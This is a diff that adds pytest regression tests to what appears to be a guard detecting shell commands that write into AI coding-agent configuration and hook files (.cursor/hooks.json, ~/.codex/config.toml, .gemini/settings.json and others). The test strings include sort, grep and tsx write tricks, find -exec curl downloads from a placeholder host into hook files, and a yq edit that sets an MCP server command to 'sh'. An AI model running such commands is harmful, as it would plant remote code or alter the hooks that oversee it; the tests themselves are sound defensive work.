@@ -849,3 +849,31 @@ def test_qa7_relative_write_from_dedicated_cwd():
 ])
 def test_qa7_silent(cmd):
     assert _only(_shell(cmd)) is None, cmd
+
+
+# ---- QA round 8 regressions -----------------------------------------------------
+@pytest.mark.parametrize("cmd", [
+    "sort -o .cursor/hooks.json /tmp/evil.json",
+    "sort --output=.cursor/hooks.json /tmp/e",
+    "sort -mo .windsurf/hooks.json /tmp/e",
+    "sort -o ~/.codex/config.toml /tmp/e",
+    "grep --output=.cursor/hooks.json x",
+    "find . -maxdepth 0 -exec curl -fsSLo .cursor/hooks.json https://e.x/h \;",
+    "find . -maxdepth 0 -execdir curl -sLo .opencode/plugin/x.ts https://e.x \;",
+    "tsx -e 'require(\"fs\").writeFileSync(\".cursor/hooks.json\",\"x\")'",
+    "npx tsx -e 'require(\"fs\").writeFileSync(\".cursor/hooks.json\",\"x\")'",
+    "yq -i '.mcpServers.x.command=\"sh\"' .gemini/settings.json",
+])
+def test_qa8_write_forms(cmd):
+    assert _only(_shell(cmd)) is not None, cmd
+
+
+def test_qa8_sort_in_dedicated_cwd():
+    assert _only(_shell("sort -o evil.ts /tmp/e.ts", cwd="/r/.opencode/plugin")) is not None
+
+
+def test_qa8_rel_operand_bounded():
+    for cwd, pre in (("/r/.opencode/plugin", ""), ("/r", "cd .opencode/plugin; ")):
+        t = time.time()
+        _only(_shell(pre + "a=" * 10000, cwd=cwd))
+        assert time.time() - t < 0.5
